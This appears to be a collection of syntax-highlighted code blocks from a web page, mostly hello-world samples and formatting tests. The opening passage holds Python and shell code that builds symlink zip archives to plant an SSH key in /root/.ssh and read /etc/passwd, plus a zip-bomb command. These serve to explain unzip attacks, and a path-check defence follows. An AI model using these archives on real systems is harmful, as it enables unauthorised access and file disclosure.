  <span class="token builtin">zip</span><span class="token punctuation">.</span>writestr<span class="token punctuation">(</span>info<span class="token punctuation">,</span> <span class="token string">"/root/.ssh/"</span><span class="token punctuation">)</span>

  <span class="token comment"># Add an file from our filesystem. (Not a symlink.)</span>
  <span class="token builtin">zip</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"my-ssh-key.pub"</span><span class="token punctuation">,</span> <span class="token string">"dirlink/authorized_keys"</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># evil-link-dir.zip</span>
<span class="token comment">#  dirlink/           -&gt; /some/readable/directory/</span>
<span class="token comment">#      passwd.html    -&gt; /etc/passwd</span>
<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">"evil-link-dir-file.zip"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> compression<span class="token operator">=</span>zipfile<span class="token punctuation">.</span>ZIP_DEFLATED<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">zip</span><span class="token punctuation">:</span>
  <span class="token comment"># Order matters! Write dir first, then file.</span>
  info <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipInfo<span class="token punctuation">(</span><span class="token string">"dirlink"</span><span class="token punctuation">)</span>
  info<span class="token punctuation">.</span>create_system <span class="token operator">=</span> <span class="token number">0</span>
  info<span class="token punctuation">.</span>external_attr <span class="token operator">=</span> <span class="token punctuation">(</span>stat<span class="token punctuation">.</span>S_IFLNK <span class="token operator">|</span> <span class="token number">0o777</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span>
  <span class="token builtin">zip</span><span class="token punctuation">.</span>writestr<span class="token punctuation">(</span>info<span class="token punctuation">,</span> <span class="token string">"/some/readable/directory/"</span><span class="token punctuation">)</span>

  info <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipInfo<span class="token punctuation">(</span><span class="token string">"dirlink/passwd.html"</span><span class="token punctuation">)</span>
  info<span class="token punctuation">.</span>create_system <span class="token operator">=</span> <span class="token number">0</span>
  info<span class="token punctuation">.</span>external_attr <span class="token operator">=</span> <span class="token punctuation">(</span>stat<span class="token punctuation">.</span>S_IFLNK <span class="token operator">|</span> <span class="token number">0o777</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span>
  <span class="token builtin">zip</span><span class="token punctuation">.</span>writestr<span class="token punctuation">(</span>info<span class="token punctuation">,</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span></code></pre>
<pre class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token comment"># Create our (soft) links.</span>
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /some/readable/directory/ dirlink
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /etc/passwd dirlink/passwd.txt
<span class="token comment"># Zip the links. (Order matters!)</span>
<span class="token function">zip</span> <span class="token parameter variable">-y</span> evil-link-dir-file dirlink dirlink/passwd.txt</code></pre>
<pre class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token comment"># Create a blank file with 5GB of null bytes.</span>
<span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>/dev/zero <span class="token assign-left variable">bs</span><span class="token operator">=</span><span class="token number">20000</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">250000</span> <span class="token operator">&gt;</span>zero.txt
<span class="token comment"># </span>
<span class="token comment"># Zip it.</span>
<span class="token function">zip</span> test.zip test.txt
<span class="token comment"># </span>
<span class="token comment"># Count the number of bytes.</span>
<span class="token function">wc</span> <span class="token parameter variable">-c</span> zero.txt zero.zip
<span class="token comment">#  5000000000 zero.txt</span>
<span class="token comment">#  4852639 zero.zip</span>
<span class="token comment">#  5004852639 total</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fileToUnzip<span class="token punctuation">.</span><span class="token function">isAChildOf</span><span class="token punctuation">(</span>directoryToUnzipTo<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token comment">// Attack attempt detected: attempted write outside of unzip directory.</span>
  <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token double-colon punctuation">::</span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token string">"..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre data-lang-off="" class="language-txt" tabindex="0"><code class="language-txt">SGVsbG8gd29ybGQhCg==</code></pre>
<pre class="language-py" tabindex="0"><code class="language-py"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span></code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello world!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-scala" tabindex="0"><code class="language-scala"><span class="token keyword">object</span> HelloWorld <span class="token punctuation">{</span>
  <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    println<span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-rust" tabindex="0"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-sql" tabindex="0"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token string">'Hello'</span> <span class="token operator">||</span> <span class="token string">' '</span> <span class="token operator">||</span> <span class="token string">'world!'</span><span class="token punctuation">;</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">main</span> <span class="token operator">::</span> <span class="token constant">IO</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token hvariable">main</span> <span class="token operator">=</span> <span class="token builtin">putStrLn</span> <span class="token string">"Hello world!"</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hello world!"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-js" tabindex="0"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">echo</span> <span class="token builtin class-name">test</span></code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Bzzz... target acquired~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hello world!"</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-rust" tabindex="0"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-haskell" tabindex="0"><code class="language-haskell"><span class="token hvariable">main</span> <span class="token operator">::</span> <span class="token constant">IO</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token hvariable">main</span> <span class="token operator">=</span> <span class="token builtin">putStrLn</span> <span class="token string">"Hello world!"</span></code></pre>
<pre class="line-numbers language-scala" tabindex="0"><code class="language-scala"><span class="token keyword">object</span> HelloWorld <span class="token punctuation">{</span>
  <span class="token keyword">def</span> main<span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Unit</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    println<span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">echo</span> <span class="token string">"Hello world!"</span></code></pre>
<pre><code>Just plain text.</code></pre>
<pre data-test="true" data-filename-abc="a/file/path" class="language-txt" tabindex="0"><code class="language-txt">Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! </code></pre>
<pre class="line-numbers language-txt" data-start="2" tabindex="0"><code class="language-txt">This raw text
is not highlighted
but it still has
line numbers</code></pre>
<pre class="line-numbers language-cpp" data-start="3" data-output="2,5-6" tabindex="0"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// This line is skipped.</span>
  Dog d<span class="token punctuation">;</span>
  d<span class="token punctuation">.</span><span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// These lines are </span>
  <span class="token comment">// also skipped.</span>
<span class="token punctuation">}</span></code></pre>
<pre class="command-line language-sh" data-output="1" tabindex="0"><code class="language-sh"><span class="token comment"># Multiline.</span>
<span class="token function">mkdir</span> build
<span class="token builtin class-name">cd</span> build
cmake <span class="token punctuation">..</span>
<span class="token function">make</span></code></pre>
<pre class="command-line line-numbers language-txt" data-output="6" tabindex="0"><code class="language-txt">What
if
we
mix
command line
# woohoo!
and
line numbers?
More
MOre
MORE
MOREEE</code></pre>
<pre class="command-line language-powershell" data-prompt="PS C:\Users\Chris>" data-output="2-19" tabindex="0"><code class="language-powershell"><span class="token function">dir</span>


    Directory: C:\Users\Chris


Mode                LastWriteTime     Length Name
<span class="token operator">--</span><span class="token operator">--</span>                <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>     <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span>
d-r-<span class="token operator">-</span>        10/14/2015   5:06 PM            Contacts
d-r-<span class="token operator">-</span>        12/12/2015   1:47 PM            Desktop
d-r-<span class="token operator">-</span>         11/4/2015   7:59 PM            Documents
d-r-<span class="token operator">-</span>        10/14/2015   5:06 PM            Downloads
d-r-<span class="token operator">-</span>        10/14/2015   5:06 PM            Favorites
d-r-<span class="token operator">-</span>        10/14/2015   5:06 PM            Links
d-r-<span class="token operator">-</span>        10/14/2015   5:06 PM            Music
d-r-<span class="token operator">-</span>        10/14/2015   5:06 PM            Pictures
d-r-<span class="token operator">-</span>        10/14/2015   5:06 PM            Saved Games
d-r-<span class="token operator">-</span>        10/14/2015   5:06 PM            Searches
d-r-<span class="token operator">-</span>        10/14/2015   5:06 PM            Videos</code></pre>
<pre class="language-diff-js" tabindex="0"><code class="language-diff-js"><span class="token inserted-sign inserted language-js"><span class="token prefix inserted">+</span><span class="token keyword">function</span> <span class="token function">myFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="token unchanged language-js"><span class="token prefix unchanged"> </span>  <span class="token comment">// </span>
</span><span class="token deleted-sign deleted language-js"><span class="token prefix deleted">-</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
</span><span class="token unchanged language-js"><span class="token prefix unchanged"> </span><span class="token punctuation">}</span></span></code></pre>
<pre class="line-numbers language-diff-js" tabindex="0"><code class="language-diff-js"><span class="token inserted-sign inserted language-js"><span class="token prefix inserted">+</span><span class="token keyword">function</span> <span class="token function">myFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="token unchanged language-js"><span class="token prefix unchanged"> </span>  <span class="token comment">// </span>
</span><span class="token deleted-sign deleted language-js"><span class="token prefix deleted">-</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
</span><span class="token unchanged language-js"><span class="token prefix unchanged"> </span><span class="token punctuation">}</span></span></code></pre>
<pre data-label="prism-show-filename.js" class="line-numbers language-js" data-start="13" tabindex="0"><code class="language-js">Prism<span class="token punctuation">.</span>plugins<span class="token punctuation">.</span>toolbar<span class="token punctuation">.</span><span class="token function">registerButton</span><span class="token punctuation">(</span><span class="token string">'show-filename'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">env</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> pre <span class="token operator">=</span> env<span class="token punctuation">.</span>element<span class="token punctuation">.</span>parentNode<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pre <span class="token operator">||</span> <span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">pre</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>pre<span class="token punctuation">.</span>nodeName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">var</span> filename <span class="token operator">=</span> pre<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'data-filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">var</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  element<span class="token punctuation">.</span>textContent <span class="token operator">=</span> filename<span class="token punctuation">;</span>

  <span class="token keyword">return</span> element<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre data-label="Just a casual label." class="language-txt" tabindex="0"><code class="language-txt">Hello world!</code></pre>
<pre class="language-sh" tabindex="0"><code class="language-sh"><span class="token builtin class-name">echo</span> <span class="token string">"Conversely, if you drive, don't drink."</span>
<span class="token builtin class-name">echo</span> <span class="token string">"test"</span></code></pre>
<pre class="language-txt" tabindex="0"><code class="language-txt">Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious! Supercalifragilisticespieladocious!</code></pre>
